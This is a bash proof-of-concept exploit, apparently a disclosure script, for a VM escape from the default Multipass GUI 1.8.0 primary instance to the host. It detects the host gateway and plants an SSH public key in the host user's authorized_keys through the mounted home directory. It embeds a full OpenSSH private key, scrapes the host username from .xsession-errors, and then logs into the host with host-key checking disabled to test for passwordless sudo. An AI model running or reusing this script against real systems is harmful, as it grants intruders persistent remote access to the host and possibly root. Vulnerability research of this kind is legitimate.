#!/bin/bash
clear

# Lets find out the default gateway ip to the host OS 
IP=$(/sbin/ip route | awk '/default/ { print $3 }')
#echo $IP

# Since we can access the host OS via the mounted /home/ubuntu/Home 
# we can plant a ssh-key in authorized keys 

# Lets check if .ssh exists

echo "-------------------------------------------------"
echo "Multipass.gui 1.8.0 default Primary VM escape PoC" 
echo "-------------------------------------------------" 
echo "Checking host's $home/.ssh " 
if [[ -d /home/ubuntu/Home/.ssh ]] 
  then 
echo "[*] Found .ssh directory adding a pubkey" 
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZ6Y9kc2oj2lFn0Tk/yzWmoeSVK4byfNctBIN+yp/yJreN8txo7rxXjvj8G9L4o3pDZONPFtv+RplRdbU3vvwWKTOW7MbNz7ZkxydvXU154OROccditlLNJ0aBuwsNjzkXzpV/vQbEZtt0WrinRu4XSItONLvEYtPYKpWsB08kTDuAyh4UifMP5TXcok+pVJSLHYlBStkCcT4VOhYKTqKb/qd91TO9Cez/IoB/1w9KlDlrK8aUHyzYRHn+75w9TxSGAAokIRqylglJpBoKfRk5Z0Hh4s7H2nKpigsRuZIlxa0H+boardJflsG57ZBmfd/YWoqsq6oKRy8dhtn4Bf3MCr9WxN84v5x7FQNTLNlHqOVWMwqooL2xS/XQrAe81lRH2ZpNG9LeVAB03HzY0T7nrhmCn8lab1Jb0N3aR9NZtNR6VLj6I68Tu71XIIkj8rmKHrk06ez453qf3O/JmiYyJq0PNSSJQdcBs9878UsspHhQhESvyLTqhHNr+fMw6AE= ubuntu@primary' >> /home/ubuntu/Home/.ssh/authorized_keys 

#Lets drop our pre-generated private key here 
cat << EOF > private_key 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
EOF
# Fix permissions on the private_key
chmod o=-rwx,g-rwx private_key

# Now lest search for the username the hosts OS is running Multipass under 
# This is dirty hack that assumes the user runs a GUI - since the exploit is for multipass.gui 
# and we will look for the USER=$user strings in .xsession-erros in $HOME 

NAME=$(grep 'USER=' /home/ubuntu/Home/.xsession-errors | cut -d '=' -f 2- | uniq)
echo "" 
echo "|\/|   |_|_o._  _. _ _    "
echo "|  ||_|| |_||_)(_|_\_\   escape !"
echo "            |                 " 

# And run some remote commands on the host 
# If the user has unrestricted sudo with no password we get 
# instant root on the host 

ssh -o "StrictHostKeyChecking no" -i ./private_key $NAME@$IP 'hostname | uname -a' 
ssh -o "StrictHostKeyChecking no" -i ./private_key $NAME@$IP 'sudo id'  

# Delete the private key 
rm -f private_key 

else
     echo "[-] No .ssh directory found ..exiting" 
   exit 0
fi
